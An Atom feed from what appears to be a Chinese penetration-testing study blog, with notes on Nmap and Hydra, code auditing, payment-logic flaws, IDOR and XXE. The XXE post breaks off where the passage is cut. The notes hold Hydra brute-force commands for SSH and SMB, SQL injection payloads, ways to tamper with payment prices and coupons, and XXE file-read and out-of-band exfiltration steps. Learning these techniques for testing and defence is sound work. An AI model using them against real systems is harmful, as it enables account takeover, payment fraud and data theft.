<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Dtx&#39;s Realm</title>
  
  <subtitle>HackerStuff</subtitle>
  <link href="https://dtxharry.github.io/atom.xml" rel="self"/>
  
  <link href="https://dtxharry.github.io/"/>
  <updated>2023-08-21T09:02:08.585Z</updated>
  <id>https://dtxharry.github.io/</id>
  
  <author>
    <name>dtxHarry</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="https://dtxharry.github.io/2023/08/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>https://dtxharry.github.io/2023/08/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-08-21T09:02:08.000Z</published>
    <updated>2023-08-21T09:02:08.585Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>App渗透</title>
    <link href="https://dtxharry.github.io/2023/08/21/App%E6%B8%97%E9%80%8F/"/>
    <id>https://dtxharry.github.io/2023/08/21/App%E6%B8%97%E9%80%8F/</id>
    <published>2023-08-21T09:02:01.000Z</published>
    <updated>2023-08-21T09:02:01.063Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>Cobalt_Strike(CS)</title>
    <link href="https://dtxharry.github.io/2023/08/21/Cobalt-Strike-CS/"/>
    <id>https://dtxharry.github.io/2023/08/21/Cobalt-Strike-CS/</id>
    <published>2023-08-21T08:53:17.000Z</published>
    <updated>2023-08-21T08:53:17.112Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>内网渗透</title>
    <link href="https://dtxharry.github.io/2023/08/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    <id>https://dtxharry.github.io/2023/08/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</id>
    <published>2023-08-21T08:51:15.000Z</published>
    <updated>2023-08-21T08:51:15.135Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>msf后渗透</title>
    <link href="https://dtxharry.github.io/2023/08/21/msf%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    <id>https://dtxharry.github.io/2023/08/21/msf%E5%90%8E%E6%B8%97%E9%80%8F/</id>
    <published>2023-08-21T08:50:47.000Z</published>
    <updated>2023-08-21T08:50:47.665Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>metasploit基本使用</title>
    <link href="https://dtxharry.github.io/2023/08/21/metasploit%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <id>https://dtxharry.github.io/2023/08/21/metasploit%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</id>
    <published>2023-08-21T08:50:34.000Z</published>
    <updated>2023-08-21T08:50:34.517Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>反序列化漏洞</title>
    <link href="https://dtxharry.github.io/2023/08/21/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://dtxharry.github.io/2023/08/21/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-08-21T08:50:09.000Z</published>
    <updated>2023-08-21T08:50:09.339Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>变量覆盖漏洞</title>
    <link href="https://dtxharry.github.io/2023/08/21/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://dtxharry.github.io/2023/08/21/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-08-21T08:49:57.000Z</published>
    <updated>2023-08-21T08:49:57.984Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>文件包含漏洞</title>
    <link href="https://dtxharry.github.io/2023/08/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <id>https://dtxharry.github.io/2023/08/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-08-21T08:49:42.000Z</published>
    <updated>2023-08-21T08:49:42.609Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>命令执行漏洞</title>
    <link href="https://dtxharry.github.io/2023/08/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>https://dtxharry.github.io/2023/08/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-08-21T08:44:00.000Z</published>
    <updated>2023-08-21T08:44:00.574Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>代码执行漏洞</title>
    <link href="https://dtxharry.github.io/2023/08/21/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>https://dtxharry.github.io/2023/08/21/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-08-21T08:43:51.000Z</published>
    <updated>2023-08-21T08:43:51.118Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>内网信息收集(Nmap与Hydra)</title>
    <link href="https://dtxharry.github.io/2023/08/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-Nmap%E4%B8%8EHydra/"/>
    <id>https://dtxharry.github.io/2023/08/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-Nmap%E4%B8%8EHydra/</id>
    <published>2023-08-21T08:43:32.000Z</published>
    <updated>2023-08-21T14:59:53.650Z</updated>
    
    <content type="html"><![CDATA[<p>官方脚本：<br><a href="https://svn.nmap.org/nmap/scripts/">https://svn.nmap.org/nmap/scripts/</a><br>CVE查询：<br><a href="http://cve.scap.org.cn/">http://cve.scap.org.cn/</a><br><a href="http://cve.mitre.org/">http://cve.mitre.org/</a></p><h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a><strong>nmap</strong></h1><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>一 、检测存活在网络上的主机（主机发现）<br>二、 检测主机上开放的端口（端口发现或枚举）<br>三、 检测到相应的端口（服务发现）的软件和版本<br>四、 检测操作系统，硬件地址，以及软件版本<br>五、 检测脆弱性的漏洞（Nmap的脚本）</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>-sS :     TCP SYN扫描<br>-p:         指定端口号扫描<br>-v：      显示扫描过程<br>-F：    快速扫描<br>-Pn：   禁止ping后扫描: 跳过主机发现的过程进行端口扫描<br>-A：     全面的系统扫描:包括打开操作系统探测、版本探测、脚本扫描、路径跟踪</p><h2 id="扫描指定IP开放端口命令"><a href="#扫描指定IP开放端口命令" class="headerlink" title="扫描指定IP开放端口命令:"></a>扫描指定IP开放端口命令:</h2><p>nmap –sS -p 端口号 -v 192.168.1.2<br>使用半开放扫描，指定端口号1-65535，显示扫描过程</p><h2 id="穿透防火墙扫描命令："><a href="#穿透防火墙扫描命令：" class="headerlink" title="穿透防火墙扫描命令："></a>穿透防火墙扫描命令：</h2><p>nmap –Pn/P0 -A 192.168.1.2<br>服务器禁止ping命令，试试-Pn，nmap参数配合使用</p><h2 id="常用的端口扫描指令"><a href="#常用的端口扫描指令" class="headerlink" title="常用的端口扫描指令"></a>常用的端口扫描指令</h2><p>-sU :        UDP扫描（不可靠）<br>-sT:          TCP扫描<br>-sV：        扫描系统版本和程序版本检测<br>-T4：        默认3，越高扫描越快，但也容易被防火墙或IDS检测并屏蔽掉<br>-R:        反向域名解析<br>-sL—script=vuln     扫描常见的漏洞</p><h2 id="漏洞扫描命令"><a href="#漏洞扫描命令" class="headerlink" title="漏洞扫描命令:"></a>漏洞扫描命令:</h2><p>nmap —script=vuln 192.168.1.2<br>使用vuln脚本进行常见的漏洞扫描</p><h2 id="指纹识别扫描命令："><a href="#指纹识别扫描命令：" class="headerlink" title="指纹识别扫描命令："></a>指纹识别扫描命令：</h2><p>nmap -sV -v 192.168.1.2<br>扫描系统和程序版本号检测，并且输出详细信息</p><h2 id="端口扫描的状态"><a href="#端口扫描的状态" class="headerlink" title="端口扫描的状态"></a>端口扫描的状态</h2><p>Opend：端口开启<br>Closed：  端口关闭<br>Filtered：端口被过滤，数据没有到达主机，返回的结果为空，数据被防火墙拦截了<br>Unfiltered：未被过滤，数据有到达主机，但是不能识别端口的当前状态<br>Open|filtered：开放或者被过滤，端口没有返回值，主要发生在UDP、IP、FIN、NULL和Xmas扫描中<br>Closed|filtered：关闭或者被过滤，只发生在IP ID idle扫描</p><h2 id="把Nmap扫描结果保存到本地"><a href="#把Nmap扫描结果保存到本地" class="headerlink" title="把Nmap扫描结果保存到本地"></a>把Nmap扫描结果保存到本地</h2><h3 id="一、标准保存"><a href="#一、标准保存" class="headerlink" title="一、标准保存"></a>一、标准保存</h3><p>命令:<br>nmap –oN test.txt shop.aqlab.cn<br>标准保存会包输出结果保存到指定文件</p><h3 id="二、保存为xml格式"><a href="#二、保存为xml格式" class="headerlink" title="二、保存为xml格式"></a>二、保存为xml格式</h3><p>命令:<br>nmap –oX test.xml shop.aqlab.cn<br>保存为xml格式需要用浏览器打开，查看结果</p><h1 id="Hydra-九头蛇"><a href="#Hydra-九头蛇" class="headerlink" title="Hydra(九头蛇)"></a>Hydra(九头蛇)</h1><h2 id="命令"><a href="#命令" class="headerlink" title="命令:"></a>命令:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">常用:</span><br><span class="line">-l root    指定用户名</span><br><span class="line">-L    指定用户名字典 </span><br><span class="line"></span><br><span class="line">-p     指定密码</span><br><span class="line">-P      指定密码字典</span><br><span class="line"></span><br><span class="line">-s   指定非默认端口</span><br><span class="line">ssh 22 /1900</span><br></pre></td></tr></table></figure><p>-l LOGIN     指定破解的用户名称，对特定用户破解。<br>-L FILE     从文件中加载用户名进行破解。<br>-p PASS    小写p指定密码破解，少用，一般是采用密码字典。<br>-P FILE     大写字母P，指定密码字典。<br>-e nsr     可选选项，n：空密码试探，s：使用指定用户和密码试探，r：指定密码与用户名相反。<br>-C FILE     使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。<br>-t TASKS     同时运行的连接的线程数，每一台主机默认为16。<br>-M FILE     指定服务器目标列表文件一行一条<br>-w TIME     设置最大超时的时间，单位秒，默认是30s。<br>-o FILE     指定结果输出文件。<br>-f     在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。<br>-v / -V     显示详细过程。<br>-R     继续从上一次进度接着破解。<br>-S     采用SSL链接。<br>-s PORT     可通过这个参数指定非默认端口。<br>-U       服务模块使用细节<br>-h       更多的命令行选项（完整的帮助）<br>server      目标服务器名称或者IP（使用这个或-M选项）<br>service     指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http[s]-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等</p><p>OPT       一些服务模块支持额外的输入（-U用于模块的帮助）</p><h2 id="win密码破解"><a href="#win密码破解" class="headerlink" title="win密码破解"></a>win密码破解</h2><p>SMB服务很稳定，跑得快，不容易ban掉ip<br>hydra -l 用户名 -p 密码 smb://ip –v<br>或者hydra -l 用户名 -p 密码 ip smb –v   </p><h2 id="破解ssh"><a href="#破解ssh" class="headerlink" title="破解ssh"></a>破解ssh</h2><p>hydra -l 用户名 -P 密码字典 -t 线程 -vV -e nsr ip ssh<br>hydra -l 用户名 -P 密码字典 -t 线程 -o save.log -vV ip ssh<br>命令详细：<br>攻击目标：192.168.1.12<br>使用的模块：ssh<br>爆破用户名：root(-l)<br>使用的密码字典：/root/passwd.txt (-P)<br>爆破线程数：6 (-t)<br>显示详细信息 (-V)<br>爆破成功一个后停止 (-f)</p>]]></content>
    
    
    <summary type="html">内网渗透与web渗透一样,都是需要先进行信息收集</summary>
    
    
    
    <category term="内网渗透" scheme="https://dtxharry.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网" scheme="https://dtxharry.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
    <category term="渗透工具" scheme="https://dtxharry.github.io/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>代码审计概述</title>
    <link href="https://dtxharry.github.io/2023/08/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/"/>
    <id>https://dtxharry.github.io/2023/08/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/</id>
    <published>2023-08-21T08:42:58.000Z</published>
    <updated>2023-08-21T14:56:12.179Z</updated>
    
    <content type="html"><![CDATA[<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="好处"><a href="#好处" class="headerlink" title="好处:"></a>好处:</h2><p>1、可以挖掘到别人黑盒测试不出的漏洞<br>2、白盒测试大多都是CMS或者框架，只要找到一个漏洞就可能可以对成千上万个网站进行攻击。<br>3、会白盒代码审计，是未来的趋势，找工作的加分</p><h2 id="不好"><a href="#不好" class="headerlink" title="不好:"></a>不好:</h2><p>1、费脑子，审计过程中可能得掉头发<br>2、费时间，代码审计需要一定的时间</p><h2 id="代码审计核心"><a href="#代码审计核心" class="headerlink" title="代码审计核心:"></a>代码审计核心:</h2><p>看得懂代码</p><h2 id="基本方法"><a href="#基本方法" class="headerlink" title="基本方法:"></a>基本方法:</h2><h3 id="1-通读全文法"><a href="#1-通读全文法" class="headerlink" title="1.通读全文法"></a>1.通读全文法</h3><p> [从入口文件看，index.php] ,很费时间,需要好几天 </p><h3 id="2-定位危险函数发"><a href="#2-定位危险函数发" class="headerlink" title="2.定位危险函数发"></a>2.定位危险函数发</h3><p>[日常工作中],搜索关键的函数,比如sql注入肯定需要数据库函数支持的;<br>网站要实现功能，都是需要函数的支撑，我们找到函数来审计会比较简单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$id= &#x27; and updatexml(1,concat(&#x27;!&#x27;,database(),1) -- QWEQ</span><br><span class="line"></span><br><span class="line">get_one(  sql注入的危险函数</span><br><span class="line"></span><br><span class="line">strpos(&#x27;article&#x27;, &#x27;_category&#x27;) ? &#x27;cat_id&#x27; : &#x27;id&#x27;;</span><br><span class="line"></span><br><span class="line">三目运算符：</span><br><span class="line"></span><br><span class="line">条件?成立返回:不成立返回</span><br><span class="line"></span><br><span class="line">if(length(database())=6,1,sleep(10))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="小偏招"><a href="#小偏招" class="headerlink" title="小偏招"></a>小偏招</h2><p>小偏招，代码运行的时候，去修改代码</p>]]></content>
    
    
    <summary type="html">代码审计即白盒测试,可以挖掘到黑盒测试测不出的洞</summary>
    
    
    
    <category term="web渗透" scheme="https://dtxharry.github.io/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="代码审计" scheme="https://dtxharry.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>支付漏洞</title>
    <link href="https://dtxharry.github.io/2023/08/21/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/"/>
    <id>https://dtxharry.github.io/2023/08/21/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-08-21T08:42:50.000Z</published>
    <updated>2023-08-21T14:54:23.043Z</updated>
    
    <content type="html"><![CDATA[<h1 id="支付漏洞属于逻辑漏洞"><a href="#支付漏洞属于逻辑漏洞" class="headerlink" title="支付漏洞属于逻辑漏洞"></a>支付漏洞属于逻辑漏洞</h1><h1 id="支付过程"><a href="#支付过程" class="headerlink" title="支付过程"></a>支付过程</h1><p>用户[传参] -&gt; 商家[计算出] -&gt;第三方平台(支付宝) -&gt; 商家 -&gt;用户</p><h1 id="漏洞种类"><a href="#漏洞种类" class="headerlink" title="漏洞种类"></a>漏洞种类</h1><h2 id="1-修改支付价格"><a href="#1-修改支付价格" class="headerlink" title="1.修改支付价格"></a>1.修改支付价格</h2><p>支付三步曲——订购、订单、付款<br>三个步骤当中的随便一个步骤进行修改价格测试，如果前面两步有验证机制，那么你可在最后一步付款时进行抓包尝试修改金额，如果没有在最后一步做好检验，那么漏洞就会存在，其修改的金额值你可以尝试小数目或者尝试负数。</p><h2 id="2-修改支付状态"><a href="#2-修改支付状态" class="headerlink" title="2.修改支付状态"></a>2.修改支付状态</h2><p>订单完成——未完成（傻傻分不清）<br>A订单-0001完成——B订单-0002未完成<br>付款时尝试把订单B的单号给成订单A</p><h2 id="3-修改订单数量"><a href="#3-修改订单数量" class="headerlink" title="3.修改订单数量"></a>3.修改订单数量</h2><p>改成0或者-1,系统自动取绝对值</p><h2 id="4-修改附属值"><a href="#4-修改附属值" class="headerlink" title="4.修改附属值"></a>4.修改附属值</h2><h3 id="优惠劵"><a href="#优惠劵" class="headerlink" title="优惠劵"></a>优惠劵</h3><p>优惠劵其基本都是优惠，一般用优惠劵进行消费一般出现在第二个步骤当中：确认购买信息，在这个步骤页面当中，你可以选择相关优惠劵，然后直接修改金额大于或等于商品的价格就可以，或者直接修改其为负值进行尝试，最后进行支付，如果对这点没有加以验证，那么问题就会产生，直接支付成功</p><h3 id="修改运费支付漏洞"><a href="#修改运费支付漏洞" class="headerlink" title="修改运费支付漏洞"></a>修改运费支付漏洞</h3><p><code>http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-079085</code><br>也可以改成负数,总额=商品价格+运费,近乎白嫖</p><h2 id="5-越权支付"><a href="#5-越权支付" class="headerlink" title="5.越权支付"></a>5.越权支付</h2><p>主要针对有余额的平台,属于越权漏洞,但也算是个支付漏洞吧<br>存在user=id(123),这种传参时，尝试改改id,尝试用别人的钱包买自己的包包。</p><h2 id="6-跳过支付环节"><a href="#6-跳过支付环节" class="headerlink" title="6.跳过支付环节"></a>6.跳过支付环节</h2><p>抓包找到支付成功访问的页面，然后直接下个单子，复制订单号，然后拼接成功访问的页面<br><code>http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0108184</code><br><code>http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0188155</code></p><h1 id="防护方法"><a href="#防护方法" class="headerlink" title="防护方法"></a>防护方法</h1><h2 id="数据加密-有用-但不多"><a href="#数据加密-有用-但不多" class="headerlink" title="数据加密(有用,但不多)"></a>数据加密(有用,但不多)</h2><p>1.加密可能被解密<br>2.加密的数据也可以被复用<br>3.数据包中的加密是在前端加密的,因此会js的都能知道加密方法(因为抓包的时候就已经被加密了,请求还没发给服务器,因此一定是前端加密的)</p><h2 id="校验"><a href="#校验" class="headerlink" title="校验"></a>校验</h2><p>商品和钱的传参应该查询数据库做校验</p><h1 id="如何挖掘"><a href="#如何挖掘" class="headerlink" title="如何挖掘"></a>如何挖掘</h1><h2 id="找到关键的数据包"><a href="#找到关键的数据包" class="headerlink" title="找到关键的数据包"></a>找到关键的数据包</h2><p>​    可能一个支付操作有三四个数据包，我们要对数据包进行挑选。</p><h2 id="分析数据包"><a href="#分析数据包" class="headerlink" title="分析数据包"></a>分析数据包</h2><p>​    支付数据包中会包含很多的敏感信息（账号，金额，余额，优惠），要尝试对数据包中的各个参数进行分析。</p><h2 id="不按套路出牌"><a href="#不按套路出牌" class="headerlink" title="不按套路出牌"></a>不按套路出牌</h2><p>​    多去想想开发者没有想到的地方, pc端，wap端也看看，app也试试。</p>]]></content>
    
    
    <summary type="html">比较详细的展开讲解了一些支付漏洞的细节</summary>
    
    
    
    <category term="web渗透" scheme="https://dtxharry.github.io/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="逻辑漏洞" scheme="https://dtxharry.github.io/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>越权漏洞</title>
    <link href="https://dtxharry.github.io/2023/08/21/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    <id>https://dtxharry.github.io/2023/08/21/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-08-21T08:42:40.000Z</published>
    <updated>2023-08-21T14:53:20.565Z</updated>
    
    <content type="html"><![CDATA[<h1 id="越权定义"><a href="#越权定义" class="headerlink" title="越权定义"></a>越权定义</h1><p>是一种很常见的逻辑安全漏洞.由于服务器端对客户提出的数据操作请求过分信任，忽略了对该用户操作权限的判定，导致修改相关参数就可以拥有了其他账户的增、删、查、改功能，从而导致越权漏洞,通俗的讲,我是普通用户,但是我做了管理员的操作,越过权限了.</p><h1 id="越权分类"><a href="#越权分类" class="headerlink" title="越权分类"></a>越权分类</h1><h2 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2><p>普通用户做了管理员的操作</p><h2 id="平行越权"><a href="#平行越权" class="headerlink" title="平行越权"></a>平行越权</h2><p>相同权限的用户互相越权,A用户影响B用户或者A管理影响B管理</p><h2 id="交叉越权"><a href="#交叉越权" class="headerlink" title="交叉越权"></a>交叉越权</h2><p>既是平行越权也是垂直越权的越权</p><h1 id="与未授权访问的区别"><a href="#与未授权访问的区别" class="headerlink" title="与未授权访问的区别"></a>与未授权访问的区别</h1><p><strong>越权</strong>:你必然掌握了一定权限</p><p><strong>未授权访问</strong>:你肯定毫无权限.<br>不属于越权漏洞，但是在日常测试中常常会遇见（只要输入正确的网址就可以直接访问，例如/admin默认是登录，登录后跳转到user.php,然后你直接访问user.php，发现你直接有后台权限）(<a href="http://cn-sec.com/archives/9806.html),(http://cn-sec.com/archives/17524.html">http://cn-sec.com/archives/9806.html),(http://cn-sec.com/archives/17524.html</a>) (业务逻辑绕过） Web攻防之业务安全实战指南 (陈晓光 胡兵 张作峰 等 著)  </p><h1 id="常见的越权漏洞"><a href="#常见的越权漏洞" class="headerlink" title="常见的越权漏洞"></a>常见的越权漏洞</h1><p>1.通过修改GET传参来越权（<a href="http://cn-sec.com/archives/2572.html）(http://cn-sec.com/archives/2861.html">http://cn-sec.com/archives/2572.html）(http://cn-sec.com/archives/2861.html</a>)</p><p>2.修改POST传参进行越权（<a href="http://cn-sec.com/archives/1682.html）">http://cn-sec.com/archives/1682.html）</a></p><p>3.修改cookie传参进行越权（<a href="http://cn-sec.com/archives/6421.html）">http://cn-sec.com/archives/6421.html）</a></p><p>4.抓取传参可以在浏览器、APP、应用程序（exe）<a href="http://cn-sec.com/archives/5930.html">http://cn-sec.com/archives/5930.html</a></p><h1 id="越权测试过程"><a href="#越权测试过程" class="headerlink" title="越权测试过程"></a>越权测试过程</h1><h2 id="把握住传参就能把握住逻辑漏洞的命脉"><a href="#把握住传参就能把握住逻辑漏洞的命脉" class="headerlink" title="把握住传参就能把握住逻辑漏洞的命脉"></a><strong>把握住传参就能把握住逻辑漏洞的命脉</strong></h2><p>传参ID参数需要自己检测（常见：uid=  id= user= 等）<br>通常使用burp进行爆破传参（传参可能在GET POST COOKIE）<br>常见平行越权（不需要输入原密码的修改密码，抓包改用户名或者用户id修改他人密码修改资料的时候修改用户id查看订单的时候，遍历订单id等）</p>]]></content>
    
    
    <summary type="html">越权漏洞很常见的一种逻辑漏洞,写些我的一些想法</summary>
    
    
    
    <category term="web渗透" scheme="https://dtxharry.github.io/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="逻辑漏洞" scheme="https://dtxharry.github.io/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>XXE实体注入</title>
    <link href="https://dtxharry.github.io/2023/08/21/XXE%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
    <id>https://dtxharry.github.io/2023/08/21/XXE%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/</id>
    <published>2023-08-21T08:42:23.000Z</published>
    <updated>2023-08-21T14:49:56.352Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XXE定义"><a href="#XXE定义" class="headerlink" title="XXE定义"></a>XXE定义</h1><p>XXE   ==  xml外部实体注入 (被各种后端脚本调用)<br>          =&gt;XML只存数据,除此以外不会做任何事情 (像HTML | 传输数据 | 无预定义)<br>          =&gt; 外部实体<br>          =&gt;注入 [用户输入的数据被当做代码执行]</p><h1 id="XML定义"><a href="#XML定义" class="headerlink" title="XML定义"></a>XML定义</h1><p>XML 指可扩展标记语言（EXtensible Markup Language）<br>XML 是一种标记语言，很类似 HTMLXML 的设计宗旨是传输数据，而非显示数据<br>XML 标签没有被预定义。您需要自行定义标签。XML 被设计为具有自我描述性。<br>XML 是 W3C 的推荐标准</p><p>特点：<br>XML仅仅是纯文本，他不会做任何事情。<br>XML可以自己发明标签（允许定义自己的标签和文档结构）<br>XML 无所不在。</p><p>XML 是各种应用程序之间进行数据传输的最常用的工具，并且在信息存储和描述领域变得越来越流行</p><p>前端代码:<br>                <code>&lt;b&gt;&lt;/b&gt;</code>加粗<br>                <code>&lt;h1&gt;&lt;/h1&gt;</code>大标题<br>XML:<br>                <code>&lt;b&gt;&lt;/b&gt;</code> 名字而已<br>                <code>&lt;h1&gt;&lt;/h1&gt;</code>名字而已</p><h1 id="XML结构"><a href="#XML结构" class="headerlink" title="XML结构"></a>XML结构</h1><p>​    <code>&lt;?xml version=&quot;1.0&quot;?&gt;</code>     //文件头部分</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">scan</span> [<span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/1.txt&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"></span><br><span class="line">//DTD部分（通过特殊的命令去其他文件读取信息,就是文件包含,使用的关键字为SYSTEM）</span><br><span class="line">其中,scan是标签</span><br><span class="line"></span><br><span class="line">//test相当于自定义了变量,让包含的文件写入到test实体中</span><br></pre></td></tr></table></figure><p>​    <code>&lt;scan&gt;&amp;test;&lt;/scan&gt;</code>            //XML部分,表示test实体作用范围为scan标签</p><h1 id="XXE的寻找"><a href="#XXE的寻找" class="headerlink" title="XXE的寻找"></a>XXE的寻找</h1><h2 id="1-代码审计"><a href="#1-代码审计" class="headerlink" title="1.代码审计"></a>1.代码审计</h2><h3 id="高危函数"><a href="#高危函数" class="headerlink" title="高危函数"></a>高危函数</h3><p>simplexml_load_string()  //调用xml字符串并转换为实体对象<br>simplexml_load_file()     //读取xml文件并转化为实体对象</p><h3 id="数据外带"><a href="#数据外带" class="headerlink" title="数据外带"></a>数据外带</h3><p>大部分的xxe是没有回显的，我们不知道是否调用,所以可以考虑把数据外带出来：<br>    1、获取信息<br>    2、发送信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">XSS平台：</span><br><span class="line">你打XSS到目标站点 -&gt; 有人访问后把数据传到平台 -&gt; 记录下来，等你来看</span><br><span class="line"></span><br><span class="line">XML: 请求一个你自己搭建的php文件，其他的文件。（你想要的数据给带出来）</span><br><span class="line"> php文件记录请求的传参内容（记录文件）</span><br><span class="line"> 等你去看就可以了</span><br></pre></td></tr></table></figure><p>1.xml : 请求访问’<a href="http://127.0.0.1/WWW/2.php?id=%file">http://127.0.0.1/WWW/2.php?id=%file</a>‘.</p><p>1.php : (1) 将”PHP://filter/read=convert.base64-encode/resource=1.txt”实体化为 %file对象;<br>            (2)让 % remote 包含 1.xml 并执行<br>            (3)将(1)和(2)变为一个xml 类型的字符串 ,再实体化为 test</p><p>2.PHP : file_put_contents(“3.txt”,$_GET[“id”],FILE_APPEND); //php中的写文件函数,把id传参扩展追             加到3.TXT的内容后</p><h4 id="file-正常情况下是网站不应该使用的协议"><a href="#file-正常情况下是网站不应该使用的协议" class="headerlink" title="file:/// 正常情况下是网站不应该使用的协议"></a>file:/// 正常情况下是网站不应该使用的协议</h4><p>PHP伪协议（PHP的内部协议）<br>php://filter/read=convert.base64-encode/resource=a.txt</p><h4 id="为什么要进行base64编码"><a href="#为什么要进行base64编码" class="headerlink" title="为什么要进行base64编码?"></a>为什么要进行base64编码?</h4><p>以免特殊字符影响传参 :  <code>http://XXXX.php?id=12#45&amp;id=67</code> 这里可能会被认为是锚点导致传参不完整</p><h2 